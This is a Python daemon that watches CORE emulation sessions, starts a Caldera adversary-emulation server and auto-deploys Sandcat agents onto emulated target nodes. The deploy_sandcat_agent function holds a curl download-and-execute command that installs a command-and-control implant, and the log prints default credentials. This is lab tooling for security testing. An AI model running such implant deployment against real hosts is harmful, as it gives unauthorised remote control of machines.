#!/usr/bin/env python3
"""
Caldera Session Watcher - Auto-deploys Caldera and Sandcat agents when CORE sessions start.

This daemon runs inside the CORE container and watches for:
1. Sessions entering RUNTIME state
2. Sessions containing Caldera Docker containers (caldera-mcp-core image)

When detected, it automatically:
1. Starts Caldera server on the caldera node
2. Deploys Sandcat agents on target hosts after a delay

Usage:
    python3 caldera_session_watcher.py [--once] [--interval SECONDS]

Options:
    --once      Check once and exit (don't run as daemon)
    --interval  Polling interval in seconds (default: 5)
"""

import sys
import os
import time
import json
import subprocess
import argparse
import logging
from pathlib import Path
from typing import Dict, List, Optional, Set

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [WATCHER] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.getLogger(__name__)

# Add CORE to path
sys.path.insert(0, '/opt/core/venv/lib/python3.10/site-packages')

try:
    from core.api.grpc import client
    from core.api.grpc.wrappers import SessionState, NodeType
    CORE_AVAILABLE = True
except ImportError:
    CORE_AVAILABLE = False
    log.warning("CORE API not available - running in simulation mode")


# Track which sessions we've already deployed
deployed_sessions: Set[int] = set()

# Path to store deployment state
STATE_FILE = "/tmp/caldera_watcher_state.json"


def load_state():
    """Load previously deployed sessions from state file."""
    global deployed_sessions
    try:
        if os.path.exists(STATE_FILE):
            with open(STATE_FILE) as f:
                data = json.load(f)
                deployed_sessions = set(data.get("deployed_sessions", []))
                log.info(f"Loaded state: {len(deployed_sessions)} previously deployed sessions")
    except Exception as e:
        log.warning(f"Could not load state: {e}")


def save_state():
    """Save deployed sessions to state file."""
    try:
        with open(STATE_FILE, 'w') as f:
            json.dump({"deployed_sessions": list(deployed_sessions)}, f)
    except Exception as e:
        log.warning(f"Could not save state: {e}")


def get_core_client():
    """Get a connected CORE gRPC client."""
    if not CORE_AVAILABLE:
        return None
    try:
        core = client.CoreGrpcClient()
        core.connect()
        return core
    except Exception as e:
        log.error(f"Failed to connect to CORE: {e}")
        return None


def find_caldera_sessions(core) -> List[Dict]:
    """
    Find CORE sessions that have Caldera containers and are in RUNTIME state.

    Returns list of dicts with:
        - session_id: int
        - caldera_node: str (node name)
        - caldera_ip: str (IP address)
        - target_nodes: list of target node names
    """
    caldera_sessions = []

    try:
        sessions = core.get_sessions()

        for session_info in sessions:
            session_id = session_info.id

            # Skip already deployed sessions
            if session_id in deployed_sessions:
                continue

            # Get full session details
            session = core.get_session(session_id)

            # Only process RUNTIME sessions
            if session.state != SessionState.RUNTIME:
                continue

            # Build a map of node_id -> IP from links
            node_ips = {}
            for link in session.links:
                if link.iface1 and link.iface1.ip4:
                    ip = str(link.iface1.ip4).split('/')[0]
                    if ip:
                        node_ips[link.node1_id] = ip
                if link.iface2 and link.iface2.ip4:
                    ip = str(link.iface2.ip4).split('/')[0]
                    if ip:
                        node_ips[link.node2_id] = ip

            # Look for Caldera container nodes
            caldera_node = None
            caldera_node_id = None
            caldera_ip = None
            target_nodes = []

            for node_id, node in session.nodes.items():
                # Check if this is a Docker node with caldera image
                if node.type == NodeType.DOCKER:
                    # Check image name
                    image = getattr(node, 'image', '') or ''
                    if 'caldera' in image.lower():
                        caldera_node = node.name
                        caldera_node_id = node_id
                        caldera_ip = node_ips.get(node_id)

                # Track potential target nodes (hosts, not routers/switches)
                elif node.type == NodeType.DEFAULT:
                    name_lower = node.name.lower()
                    if any(prefix in name_lower for prefix in ['target', 'host', 'client', 'victim']):
                        target_nodes.append(node.name)

            if caldera_node and caldera_ip:
                caldera_sessions.append({
                    'session_id': session_id,
                    'caldera_node': caldera_node,
                    'caldera_ip': caldera_ip,
                    'target_nodes': target_nodes
                })
                log.info(f"Found Caldera session {session_id}: {caldera_node} @ {caldera_ip}, targets: {target_nodes}")

    except Exception as e:
        log.error(f"Error finding Caldera sessions: {e}")
        import traceback
        traceback.print_exc()

    return caldera_sessions


def execute_vcmd(session_id: int, node_name: str, command: str, timeout: int = 30, is_docker: bool = False) -> tuple:
    """Execute a command on a node via vcmd (for hosts) or docker exec (for Docker nodes)."""

    if is_docker:
        # For Docker nodes, use docker exec directly
        # CORE names Docker containers with the node name
        try:
            result = subprocess.run(
                ["docker", "exec", node_name, "bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return True, result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return False, "Command timed out"
        except Exception as e:
            return False, str(e)
    else:
        # For regular nodes, use vcmd
        vcmd_path = f"/tmp/pycore.{session_id}/{node_name}"

        if not os.path.exists(vcmd_path):
            return False, f"Node socket not found: {vcmd_path}"

        try:
            result = subprocess.run(
                ["vcmd", "-c", vcmd_path, "--", "bash", "-c", command],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return True, result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return False, "Command timed out"
        except Exception as e:
            return False, str(e)


def start_caldera_server(session_id: int, caldera_node: str) -> bool:
    """Start Caldera server on the specified node (Docker container)."""
    log.info(f"Starting Caldera server on {caldera_node}...")

    cmd = """
        if pgrep -f "python3 server.py" > /dev/null; then
            echo "Caldera already running"
        else
            echo "Starting Caldera..."
            nohup /start-caldera.sh > /tmp/caldera.log 2>&1 &
            echo "Caldera started (PID: $!)"
        fi
    """

    # Caldera is a Docker node, use docker exec
    success, output = execute_vcmd(session_id, caldera_node, cmd, is_docker=True)

    if success:
        log.info(f"  Caldera: {output.strip()}")
    else:
        log.error(f"  Failed to start Caldera: {output}")

    return success


def wait_for_caldera(session_id: int, caldera_node: str, caldera_ip: str, timeout: int = 120) -> bool:
    """Wait for Caldera to be ready."""
    log.info(f"Waiting for Caldera to be ready (timeout: {timeout}s)...")

    caldera_url = f"http://{caldera_ip}:8888"

    for i in range(timeout // 5):
        cmd = f'curl -s -o /dev/null -w "%{{http_code}}" {caldera_url} 2>/dev/null || echo "000"'
        # Caldera is Docker, use docker exec
        success, output = execute_vcmd(session_id, caldera_node, cmd, timeout=10, is_docker=True)

        if success and output.strip() == "200":
            log.info(f"  Caldera is ready!")
            return True

        if (i + 1) % 6 == 0:  # Every 30 seconds
            log.info(f"  Still waiting... ({(i+1)*5}/{timeout}s)")

        time.sleep(5)

    log.error(f"  Caldera did not become ready within {timeout}s")
    return False


def deploy_sandcat_agent(session_id: int, target_node: str, caldera_ip: str) -> bool:
    """Deploy Sandcat agent on a target node."""
    log.info(f"  Deploying Sandcat on {target_node}...")

    caldera_url = f"http://{caldera_ip}:8888"

    cmd = f"""
        curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "{caldera_url}/file/download" -o /tmp/sandcat 2>/dev/null
        if [ -f /tmp/sandcat ] && [ -s /tmp/sandcat ]; then
            chmod +x /tmp/sandcat
            nohup /tmp/sandcat -server "{caldera_url}" -group red -v > /tmp/sandcat.log 2>&1 &
            echo "Agent deployed (PID: $!)"
        else
            echo "Failed to download agent"
            exit 1
        fi
    """

    success, output = execute_vcmd(session_id, target_node, cmd, timeout=30)

    if success and "deployed" in output.lower():
        log.info(f"    {target_node}: {output.strip()}")
        return True
    else:
        log.error(f"    {target_node}: FAILED - {output.strip()}")
        return False


def deploy_caldera_session(session_info: Dict) -> bool:
    """
    Full deployment for a Caldera session:
    1. Start Caldera server
    2. Wait for it to be ready
    3. Deploy Sandcat agents on targets
    """
    session_id = session_info['session_id']
    caldera_node = session_info['caldera_node']
    caldera_ip = session_info['caldera_ip']
    target_nodes = session_info['target_nodes']

    log.info(f"="*50)
    log.info(f"Deploying Caldera session {session_id}")
    log.info(f"  Server: {caldera_node} @ {caldera_ip}:8888")
    log.info(f"  Targets: {', '.join(target_nodes) if target_nodes else 'none'}")
    log.info(f"="*50)

    # Step 1: Start Caldera
    if not start_caldera_server(session_id, caldera_node):
        log.error("Failed to start Caldera - aborting deployment")
        return False

    # Step 2: Wait for Caldera to be ready
    if not wait_for_caldera(session_id, caldera_node, caldera_ip, timeout=120):
        log.error("Caldera not ready - aborting agent deployment")
        return False

    # Step 3: Deploy Sandcat agents
    if target_nodes:
        log.info(f"Deploying Sandcat agents on {len(target_nodes)} targets...")
        deployed = 0
        for target in target_nodes:
            if deploy_sandcat_agent(session_id, target, caldera_ip):
                deployed += 1

        log.info(f"Deployed {deployed}/{len(target_nodes)} agents")
    else:
        log.info("No target nodes found for Sandcat deployment")

    # Mark as deployed
    deployed_sessions.add(session_id)
    save_state()

    log.info(f"="*50)
    log.info(f"Deployment complete!")
    log.info(f"  Caldera UI: http://{caldera_ip}:8888")
    log.info(f"  Credentials: red/admin or blue/admin")
    log.info(f"="*50)

    return True


def run_watcher(interval: int = 5, once: bool = False):
    """Main watcher loop."""
    log.info("Caldera Session Watcher starting...")
    log.info(f"  Poll interval: {interval}s")
    log.info(f"  Mode: {'single check' if once else 'daemon'}")

    load_state()

    while True:
        try:
            core = get_core_client()
            if core:
                # Find Caldera sessions that need deployment
                caldera_sessions = find_caldera_sessions(core)

                for session_info in caldera_sessions:
                    try:
                        deploy_caldera_session(session_info)
                    except Exception as e:
                        log.error(f"Deployment failed for session {session_info['session_id']}: {e}")

                core.close()

        except Exception as e:
            log.error(f"Watcher error: {e}")

        if once:
            break

        time.sleep(interval)


def main():
    parser = argparse.ArgumentParser(description='Caldera Session Watcher')
    parser.add_argument('--once', action='store_true', help='Check once and exit')
    parser.add_argument('--interval', type=int, default=5, help='Polling interval in seconds')
    args = parser.parse_args()

    run_watcher(interval=args.interval, once=args.once)


if __name__ == '__main__':
    main()
